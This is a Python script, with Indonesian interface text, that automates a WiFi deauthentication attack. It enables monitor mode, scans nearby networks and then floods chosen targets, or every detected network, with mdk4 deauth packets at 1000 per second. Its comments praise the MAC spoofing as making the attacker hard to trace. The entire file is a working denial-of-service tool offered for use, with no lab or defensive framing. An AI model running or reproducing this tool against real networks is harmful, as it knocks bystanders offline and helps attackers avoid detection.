#!/usr/bin/env python3
import csv
import glob
import os
import random
import re
import subprocess
import sys
import tempfile
import time

GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
YELLOW = "\033[93m"
RESET = "\033[0m"
BOLD = "\033[1m"

GLITCH_CHARS = "!@#$%^&*<>/\\|~?01"
GLITCH_COLORS = [GREEN, RED, CYAN, MAGENTA, YELLOW]



def glitch_text(text):
    return f"{BOLD}{random.choice(GLITCH_COLORS)}{text}{RESET}"


def glitch_print(text, delay=0.02, rounds=8):
    n = len(text)
    settled = [False] * n

    for r in range(rounds):
        settle_ratio = (r + 1) / rounds
        line = ""
        for i, c in enumerate(text):
            if c == " ":
                line += " "
                continue

            if settled[i]:
                line += f"{GREEN}{c}{RESET}"
                continue

            if random.random() < settle_ratio * 0.5:
                settled[i] = True
                line += f"{GREEN}{c}{RESET}"
            else:
                glitch_char = random.choice(GLITCH_CHARS)
                color = random.choice(GLITCH_COLORS)
                line += f"{color}{glitch_char}{RESET}"

        sys.stdout.write("\r" + line + "\033[K")
        sys.stdout.flush()
        time.sleep(delay)

    for _ in range(2):
        flash = f"{BOLD}{random.choice(GLITCH_COLORS)}{text}{RESET}"
        sys.stdout.write("\r" + flash + "\033[K")
        sys.stdout.flush()
        time.sleep(0.05)

    sys.stdout.write("\r" + f"{GREEN}{text}{RESET}" + "\033[K" + "\n")
    sys.stdout.flush()


def get_wireless_interfaces():
    output = subprocess.run(["ip", "link"], capture_output=True, text=True).stdout
    interfaces = []
    for line in output.splitlines():
        m = re.match(r"^\d+:\s+(\S+):", line)
        if m:
            name = m.group(1)
            if name == "lo":
                continue
            interfaces.append(name)
    return interfaces


def get_monitor_interface_name(adapter, output):
    current_ifaces = get_wireless_interfaces()
    for iface in current_ifaces:
        if iface != adapter and iface.endswith("mon"):
            return iface

    match = re.search(r"\[(?:phy\d+)\]([A-Za-z0-9_.:-]+mon)\b", output, re.IGNORECASE)
    if match:
        return match.group(1)

    match = re.search(r"\b([A-Za-z0-9_.:-]+mon)\b", output, re.IGNORECASE)
    if match:
        return match.group(1)

    try:
        iw_output = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
        for line in iw_output.splitlines():
            m = re.search(r"\bInterface\s+(\S+)", line)
            if m:
                iface = m.group(1)
                if iface != adapter and iface.endswith("mon"):
                    return iface
    except FileNotFoundError:
        pass

    return f"{adapter}mon"


def run_command(cmd, description=None, show_output=True):
    if description:
        print(f"\n{CYAN}>{description}{RESET}")

    if show_output:
        print(" ".join(cmd))

    result = subprocess.run(cmd, capture_output=True, text=True)
    if show_output:
        if result.stdout:
            print(result.stdout.strip())
        if result.stderr:
            print(result.stderr.strip())

    if result.returncode != 0:
        print(f"{RED}Perintah gagal: {' '.join(cmd)}{RESET}")
        return None
    return result


def start_monitor_mode(adapter):
    glitch_print(f"ACTIVATING MONITOR MODE ON {adapter}...")
    run_command(["sudo", "airmon-ng", "check", "kill"], "MEMBERSIHKAN PROSES PENGANGGU", show_output=False)
    result = run_command(["sudo", "airmon-ng", "start", adapter], "MONITOR MODE AKTIF", show_output=False)
    print("")
    if result is None:
        return adapter

    output = (result.stdout or "") + (result.stderr or "")
    monitor_iface = get_monitor_interface_name(adapter, output)
    time.sleep(1)
    print(glitch_text(f"> Interface monitor aktif: {monitor_iface}"))
    print()
    return monitor_iface


def scan_networks(adapter, duration=10):

    glitch_print("SCANNING WIFI NETWORKS...")
    
    temp_dir = tempfile.mkdtemp(prefix="airodump-", dir="/tmp")
    prefix = os.path.join(temp_dir, "scan")
    proc = subprocess.Popen(
        ["sudo", "airodump-ng", "--write", prefix, "--output-format", "csv", adapter],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    try:
        time.sleep(duration)
    finally:
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()

    networks = []
    seen = set()
    for csv_path in sorted(glob.glob(prefix + "-*.csv")):
        with open(csv_path, newline="", encoding="utf-8", errors="ignore") as handle:
            reader = csv.reader(handle)
            for row in reader:
                if len(row) < 14:
                    continue
                bssid = row[0].strip()
                channel = row[3].strip()
                essid = row[13].strip()
                if not bssid or bssid.lower() == "bssid" or not essid:
                    continue
                key = (bssid, channel, essid)
                if key in seen:
                    continue
                seen.add(key)
                networks.append({"bssid": bssid, "channel": channel, "essid": essid})

    for path in glob.glob(prefix + "-*.csv"):
        try:
            os.remove(path)
        except OSError:
            pass
    try:
        os.rmdir(temp_dir)
    except OSError:
        pass

    return networks


def stop_monitor_mode(monitor_iface):

    
    candidates = [monitor_iface]
    if monitor_iface.endswith("mon"):
        candidates.append(monitor_iface[:-3])
    else:
        candidates.append(f"{monitor_iface}mon")

    for name in candidates:
        result = run_command(["sudo", "airmon-ng", "stop", name], None, show_output=False)
        if result is not None:
            break

    run_command(["sudo", "systemctl", "restart", "NetworkManager"], None, show_output=False)



def parse_target_selection(choice_str, total_targets):
    """
    Parsing input selection untuk multiple target
    Mendukung format:
    - "2" -> target nomor 2
    - "2 3 5" -> target 2, 3, dan 5
    - "2-5" -> target 2, 3, 4, 5
    - "1,3,5-7" -> kombinasi semua format
    """
    if not choice_str.strip():
        return []
    
    selected = set()
    parts = re.split(r'[,\s]+', choice_str.strip())
    
    for part in parts:
        if not part:
            continue
            
        if '-' in part:
            # Range selection (e.g., "2-5")
            try:
                start, end = part.split('-')
                start_num = int(start.strip())
                end_num = int(end.strip())
                if start_num > end_num:
                    start_num, end_num = end_num, start_num
                for num in range(start_num, end_num + 1):
                    if 1 <= num <= total_targets:
                        selected.add(num)
            except ValueError:
                continue
        else:
            # Single selection
            try:
                num = int(part.strip())
                if 1 <= num <= total_targets:
                    selected.add(num)
            except ValueError:
                continue
    
    return sorted(selected)


def select_targets(networks):
    """Memilih multiple target WiFi dengan berbagai format input"""
    if not networks:
        print("Ga ada jaringan yang ketemu.")
        return None

    print(f"\n{BOLD}Pilih target WiFi (bisa pilih banyak):{RESET}")
    print(f"{YELLOW}Format: 1 3 5  atau  2-5  atau  1,3,5-7  atau  kombinasi{RESET}")
    print()
    
    header = f"{'No':<3} {'ESSID':<20} {'CH':<3} {'BSSID'}"
    print(header)
    print("-" * len(header))
    for idx, net in enumerate(networks, start=1):
        essid = net["essid"][:20]
        print(f"{GREEN}{idx:<3}{RESET} {essid:<20} {net['channel']:<3} {net['bssid']}")

    while True:
        choice = input("\nNomor target (pisahkan dengan spasi/koma, contoh: 2 3 5): ").strip()
        
        if not choice:
            print("Input tidak boleh kosong, coba lagi.")
            continue
        
        selected_indices = parse_target_selection(choice, len(networks))
        
        if not selected_indices:
            print("Input salah atau tidak ada target valid, coba lagi.")
            continue
        
        selected_targets = [networks[idx - 1] for idx in selected_indices]
        
        print(f"\n{GREEN}✓ Terpilih {len(selected_targets)} target:{RESET}")
        for target in selected_targets:
            print(f"  - {target['essid']} | CH {target['channel']} | BSSID {target['bssid']}")
        
        confirm = input(f"\n{YELLOW}Lanjutkan serangan ke semua target? (y/n): {RESET}").strip().lower()
        if confirm in ['y', 'yes', '']:
            glitch_print(f"TARGET LOCKED: {len(selected_targets)} targets selected")
            return selected_targets
        else:
            print("Mengulang pemilihan target...\n")
            continue


def select_attack_mode():
    print(f"\n{BOLD}Pilih mode serangan:{RESET}")
    print(f"{GREEN}1.{RESET} Target spesifik (pilih target sendiri)")
    print(f"{GREEN}2.{RESET} Semua target (serang semua jaringan yang terdeteksi)")

    while True:
        choice = input("\nNomor mode [1-2]: ").strip()
        if choice == "1":
            return "target"
        if choice == "2":
            return "all"
        print("Input salah, pilih 1 atau 2.")


def run_deauth_mdk4(targets, monitor_iface):
    """
    Menjalankan MDK4 untuk multiple target dengan MODE OP
    - MAC Spoofing (-f): Sulit dilacak
    - Packet Rate 1000/s (-s 1000): Super agresif
    - Channel Hopping (-c h): Serang semua channel
    """
    if not targets:
        print(f"{RED}Tidak ada target untuk diserang.{RESET}")
        return
    
    # Siapkan file target untuk MDK4
    target_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
    try:
        for target in targets:
            # Format: BSSID,channel
            target_file.write(f"{target['bssid']},{target['channel']}\n")
        target_file.close()
        
        # Tampilkan target yang akan diserang
        print(f"\n{CYAN}{BOLD}▶ Memulai serangan MDK4 OP ke {len(targets)} target...{RESET}")
        print(f"{YELLOW}Target yang diserang:{RESET}")
        for target in targets:
            print(f"  - {target['essid']} | CH {target['channel']} | {target['bssid']}")
        
        # Base command dengan semua fitur OP
        mdk4_cmd = [
            "sudo",
            "mdk4",
            monitor_iface,
            "d",            # Deauth mode
            "-B", target_file.name,  # Target list file
            "-c", "h",      # High speed channel hopping
            "-f",           # MAC Spoofing - Sulit dilacak!
            "-s", "1000"    # 1000 packets per second - Super agresif!
        ]
        
        print(f"\n{RED}{BOLD}🔥 MODE OP AKTIF! 🔥{RESET}")
        print(f"{CYAN}✓ MAC Spoofing: AKTIF (sulit dilacak){RESET}")
        print(f"{CYAN}✓ Packet Rate: 1000 packets/detik (super agresif){RESET}")
        print(f"{CYAN}✓ Channel Hopping: AKTIF{RESET}")
        
        print(f"\n{YELLOW}Menjalankan MDK4...{RESET}")
        print(f"{CYAN}{' '.join(mdk4_cmd)}{RESET}")
        print(f"{YELLOW}Tekan Ctrl+C untuk menghentikan serangan{RESET}")
        print(f"{YELLOW}MDK4 akan menyerang semua target secara simultan!{RESET}\n")
        
        # Jalankan MDK4
        proc = subprocess.Popen(mdk4_cmd)
        
        try:
            proc.wait()
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Menghentikan MDK4...{RESET}")
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()
            print(f"{GREEN}✓ Serangan MDK4 dihentikan.{RESET}")
            
    finally:
        # Bersihkan file temporary
        try:
            os.unlink(target_file.name)
        except OSError:
            pass


def run_deauth_all_mdk4(monitor_iface):
    """
    Menjalankan MDK4 untuk semua target dengan MODE OP
    - MAC Spoofing (-f): Sulit dilacak
    - Packet Rate 1000/s (-s 1000): Super agresif
    - Channel Hopping (-c h): Serang semua channel
    """
    print(f"\n{CYAN}{BOLD}▶ Memulai serangan MDK4 OP ke SEMUA target...{RESET}")
    print(f"{YELLOW}MDK4 akan menyerang semua jaringan yang terdeteksi!{RESET}")
    
    mdk4_cmd = [
        "sudo",
        "mdk4",
        monitor_iface,
        "d",            # Deauth mode
        "-c", "h",      # High speed channel hopping
        "-f",           # MAC Spoofing
        "-s", "1000"    # 1000 packets per second
    ]
    
    print(f"\n{RED}{BOLD}🔥 MODE OP AKTIF! 🔥{RESET}")
    print(f"{CYAN}✓ MAC Spoofing: AKTIF (sulit dilacak){RESET}")
    print(f"{CYAN}✓ Packet Rate: 1000 packets/detik (super agresif){RESET}")
    print(f"{CYAN}✓ Channel Hopping: AKTIF{RESET}")
    
    print(f"\n{YELLOW}Menjalankan MDK4...{RESET}")
    print(f"{CYAN}{' '.join(mdk4_cmd)}{RESET}")
    print(f"{YELLOW}Tekan Ctrl+C untuk menghentikan serangan{RESET}\n")
    
    proc = subprocess.Popen(mdk4_cmd)
    
    try:
        proc.wait()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Menghentikan MDK4...{RESET}")
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
        print(f"{GREEN}✓ Serangan MDK4 dihentikan.{RESET}")


def prompt_keyboard_interrupt_action():
    print(f"\n{YELLOW}Keyboard interrupt diterima.{RESET}")
    print(f"{GREEN}1.{RESET} Pilih target lagi")
    print(f"{GREEN}2.{RESET} Kembali ke menu")
    print(f"{GREEN}3.{RESET} Keluar")

    while True:
        choice = input("\nPilih opsi [1-3]: ").strip()
        if choice == "1":
            return "restart"
        if choice == "2":
            return "menu"
        if choice == "3":
            return "exit"
        print("Input salah, pilih 1, 2, atau 3.")


def back_to_menu():
    menu_path = os.path.join(os.path.dirname(__file__), "deauth-menu.py")
    if not os.path.exists(menu_path):
        menu_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "deauth-menu.py"))
    os.execvp(sys.executable, [sys.executable, menu_path])


def select_interface():
    glitch_print("SCANNING INTERFACES...")
    ifaces = get_wireless_interfaces()
    if not ifaces:
        print("Ga ada interface ditemukan.")
        sys.exit(1)

    print(f"\n{BOLD}Pilih interface:{RESET}")
    for idx, name in enumerate(ifaces, start=1):
        print(f"{GREEN}{idx}.{RESET} {name}")

    while True:
        choice = input("\nNomor: ").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
            selected = ifaces[int(choice) - 1]
            glitch_print(f"LOCKED: {selected}")
        
            return selected
        print("Input salah, coba lagi.")


def main():
    adapter = None
    monitor_iface = None

    while True:
        try:
            if monitor_iface is None:
                adapter = select_interface()
                monitor_iface = start_monitor_mode(adapter)

        
            
            # Pilih mode serangan
            attack_mode = select_attack_mode()
            
            if attack_mode == "target":
                # Mode target spesifik dengan multiple selection
                print(f"{CYAN}{BOLD}[?]{RESET} Mau scan WiFi berapa detik?")
                scan_input = input(f"{YELLOW}>> detik (default 10): {RESET}").strip()
                
                if scan_input.isdigit() and int(scan_input) > 0:
                    scan_duration = int(scan_input)
                else:
                    scan_duration = 10
                
                networks = scan_networks(monitor_iface, duration=scan_duration)
                targets = select_targets(networks)
                
                if targets is None or not targets:
                    print("\nTidak ada target terpilih, kembali ke awal.")
                    continue
                
                # Jalankan serangan MDK4 OP untuk target yang dipilih
                run_deauth_mdk4(targets, monitor_iface)
            else:
                # Mode semua target dengan OP
                run_deauth_all_mdk4(monitor_iface)
            
            # Setelah serangan selesai, stop monitor mode
            stop_monitor_mode(monitor_iface)
            break

        except KeyboardInterrupt:
            action = prompt_keyboard_interrupt_action()
            if action == "restart":
                print("\nMengulang ke pemilihan target...")
                continue
            if action == "menu":
                if monitor_iface:
                    stop_monitor_mode(monitor_iface)
                back_to_menu()
            if action == "exit":
                if monitor_iface:
                    stop_monitor_mode(monitor_iface)
            
                sys.exit(0)


if __name__ == "__main__":
    main()